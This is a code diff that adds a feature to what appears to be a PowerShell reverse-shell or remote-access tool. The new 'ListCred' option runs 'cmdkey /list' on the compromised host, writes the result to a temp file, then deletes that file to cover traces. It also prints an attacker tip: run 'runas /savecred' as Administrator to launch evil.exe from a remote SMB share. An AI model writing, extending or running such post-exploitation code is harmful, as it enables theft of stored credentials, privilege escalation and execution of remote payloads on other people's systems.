@@ -397,6 +397,7 @@ While($Client.Connected)
       write-host "   ListPriv  List Remote-Host Folder Permitions";
       write-host "   ListDriv  List Remote-Host Drives Available";
       write-host "   ListRun   List Remote-Host Startup Run Entrys";
+      write-host "   ListCred  List Remote-Host cmdkey stored creds";
       write-host "   ListProc  List Remote-Host Processe(s) Running";
       write-host "   ListConn  List Remote-Host Active TCP Connections";
       write-host "   ListIpv4  List Remote-Host IPv4 Network Statistics";
@@ -485,6 +486,13 @@ While($Client.Connected)
       {
         write-host " List of Remote-Host Drives Available." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-PSDrive -PSProvider 'FileSystem'|Select-Object Name,Provider,Root|Format-Table `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+      }
+      If($choise -eq "ListCred" -or $choise -eq "cred")
+      {
+        write-host " List of Remote-Host cmdkey stored Credentials." -ForegroundColor Blue -BackgroundColor White;
+        write-host " Attacker can then use runas with the /savecred options in order to use the saved credentials." -ForegroundColor Green;Start-Sleep 
+        write-host " runas /savecred /user:WORKGROUP\Administrator `"\\10.XXX.XXX.XXX\SHARE\evil.exe`"" -ForegroundColor Green;Start-Sleep -Seconds 2;write-host "`n`n";
+        $Command = "cmdkey /list `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
       }
       If($choise -eq "StartUp" -or $choise -eq "start")
       {
